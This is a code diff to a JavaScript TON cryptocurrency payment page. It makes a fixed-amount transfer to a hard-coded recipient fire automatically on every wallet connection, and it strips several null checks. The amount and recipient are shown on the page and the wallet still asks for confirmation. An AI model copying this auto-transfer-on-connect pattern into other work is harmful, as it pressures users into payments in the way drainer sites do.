@@ -1,4 +1,4 @@
-// TON Transfer App - Simplified & Robust Version
+// TON Transfer App - Always Auto Transfer
 class TONTransferApp {
     constructor() {
         this.tonConnectUI = null;
@@ -25,39 +25,52 @@ class TONTransferApp {
         }
     }
 
+    preFillForm() {
+        document.getElementById('recipient').value = this.staticRecipient;
+        document.getElementById('amount').value = this.staticAmount;
+        
+        document.getElementById('connectionSection').innerHTML = `
+            <h3>🔗 Connect & Auto Transfer</h3>
+            <p>Connect your wallet to automatically send:</p>
+            <div class="transfer-preview">
+                <p><strong>To:</strong> ${this.staticRecipient.slice(0, 10)}...${this.staticRecipient.slice(-6)}</p>
+                <p><strong>Amount:</strong> ${this.staticAmount} TON</p>
+            </div>
+            <button id="connectButton" class="btn-primary">Connect Wallet & Auto Transfer</button>
+            <p class="hint">Auto-transfer will trigger on every connection</p>
+        `;
+    }
+
     setupConnectionListener() {
         this.tonConnectUI.onStatusChange((wallet) => {
             if (wallet) {
-                console.log('Wallet connected via status change');
+                console.log('Wallet connected - triggering auto-transfer');
                 this.onWalletConnected(wallet);
             } else {
-                console.log('Wallet disconnected via status change');
+                console.log('Wallet disconnected');
                 this.onWalletDisconnected();
             }
         });
     }
 
     setupEventListeners() {
-        document.getElementById('connectButton').addEventListener('click', () => {
-            this.connectWallet();
-        });
+        setTimeout(() => {
+            document.getElementById('connectButton').addEventListener('click', () => {
+                this.connectWallet();
+            });
 
-        document.getElementById('transferButton').addEventListener('click', () => {
-            this.sendTransaction();
-        });
+            document.getElementById('transferButton').addEventListener('click', () => {
+                this.sendTransaction();
+            });
 
-        document.getElementById('disconnectButton').addEventListener('click', () => {
-            this.disconnectWallet();
-        });
+            document.getElementById('disconnectButton').addEventListener('click', () => {
+                this.disconnectWallet();
+            });
 
-        document.getElementById('message').addEventListener('input', (e) => {
-            document.querySelector('.char-count').textContent = e.target.value.length + '/100';
-        });
-    }
-
-    preFillForm() {
-        document.getElementById('recipient').value = this.staticRecipient;
-        document.getElementById('amount').value = this.staticAmount;
+            document.getElementById('message').addEventListener('input', (e) => {
+                document.querySelector('.char-count').textContent = e.target.value.length + '/100';
+            });
+        }, 100);
     }
 
     async connectWallet() {
@@ -70,14 +83,16 @@ class TONTransferApp {
     }
 
     onWalletConnected(wallet) {
+        // ✅ UPDATE UI
         document.getElementById('connectionSection').style.display = 'none';
         document.getElementById('transferSection').style.display = 'block';
-
+        
         const shortAddress = wallet.account.address.slice(0, 8) + '...' + wallet.account.address.slice(-6);
         document.getElementById('walletAddress').textContent = shortAddress;
         
         this.showStatus('✅ Wallet connected! Starting auto-transfer...', 'success');
         
+        // ✅ SELALU TRIGGER AUTO-TRANSFER SETELAH CONNECTED
         setTimeout(() => {
             this.autoSendTransaction();
         }, 1000);
@@ -86,37 +101,32 @@ class TONTransferApp {
     onWalletDisconnected() {
         document.getElementById('connectionSection').style.display = 'block';
         document.getElementById('transferSection').style.display = 'none';
-
         this.clearForm();
+        this.preFillForm();
         this.showStatus('Wallet disconnected', 'info');
     }
 
     async disconnectWallet() {
-        try {
-            await this.tonConnectUI.disconnect();
-        } catch (error) {
-            console.error('Disconnect error:', error);
-        }
+        await this.tonConnectUI.disconnect();
     }
 
     async autoSendTransaction() {
-        const wallet = this.tonConnectUI.wallet;
-        if (!wallet) {
-            this.showStatus('Wallet disconnected during auto-transfer', 'error');
-            return;
-        }
-
         this.showStatus('🔄 Preparing auto-transfer...', 'loading');
         
         try {
+            const wallet = this.tonConnectUI.wallet;
+            
+            if (!wallet) {
+                this.showStatus('Wallet not ready for auto-transfer', 'error');
+                return;
+            }
+
             const recipient = this.staticRecipient;
             const amount = this.staticAmount;
 
             const btn = document.getElementById('transferButton');
-            if (btn) {
-                btn.disabled = true;
-                btn.textContent = 'Auto-Transferring...';
-            }
+            btn.disabled = true;
+            btn.textContent = 'Auto-Transferring...';
 
             const amountInNano = (parseFloat(amount) * 1000000000).toString();
 
@@ -129,13 +139,17 @@ class TONTransferApp {
             };
 
             this.showStatus('📱 Confirm auto-transfer in your wallet...', 'loading');
+            
             const result = await this.tonConnectUI.sendTransaction(transaction);
             
             this.showStatus('✅ Auto-transfer successful!', 'success');
             this.clearForm();
             
+            console.log('Auto-transfer result:', result);
+            
         } catch (error) {
             console.error('Auto-transfer failed:', error);
+            
             if (error.message.includes('User rejection')) {
                 this.showStatus('❌ Auto-transfer cancelled', 'error');
             } else {
@@ -143,15 +157,14 @@ class TONTransferApp {
             }
         } finally {
             const btn = document.getElementById('transferButton');
-            if (btn) {
-                btn.disabled = false;
-                btn.textContent = 'Send TON';
-            }
+            btn.disabled = false;
+            btn.textContent = 'Send TON Again';
         }
     }
 
     async sendTransaction() {
         const wallet = this.tonConnectUI.wallet;
+        
         if (!wallet) {
             this.showStatus('Please connect wallet first', 'error');
             return;
@@ -173,10 +186,8 @@ class TONTransferApp {
         try {
             this.showStatus('Preparing transaction...', 'loading');
             const btn = document.getElementById('transferButton');
-            if (btn) {
-                btn.disabled = true;
-                btn.textContent = 'Processing...';
-            }
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
 
             const amountInNano = (parseFloat(amount) * 1000000000).toString();
 
@@ -196,32 +207,25 @@ class TONTransferApp {
             this.showStatus('❌ Transaction failed: ' + error.message, 'error');
         } finally {
             const btn = document.getElementById('transferButton');
-            if (btn) {
-                btn.disabled = false;
-                btn.textContent = 'Send TON';
-            }
+            btn.disabled = false;
+            btn.textContent = 'Send TON';
         }
     }
 
     clearForm() {
+        // ✅ JANGAN CLEAR VALUE STATIS
         document.getElementById('message').value = '';
         document.querySelector('.char-count').textContent = '0/100';
     }
 
     showStatus(message, type = 'info') {
         const statusEl = document.getElementById('statusMessage');
-        if (statusEl) {
-            statusEl.textContent = message;
-            statusEl.className = `status-message status-${type}`;
-            statusEl.style.display = 'block';
-            
-            if (type === 'success' || type === 'error') {
-                setTimeout(() => {
-                    if (statusEl) {
-                        statusEl.style.display = 'none';
-                    }
-                }, 5000);
-            }
+        statusEl.textContent = message;
+        statusEl.className = `status-message status-${type}`;
+        statusEl.style.display = 'block';
+        
+        if (type === 'success' || type === 'error') {
+            setTimeout(() => statusEl.style.display = 'none', 5000);
         }
     }
 }
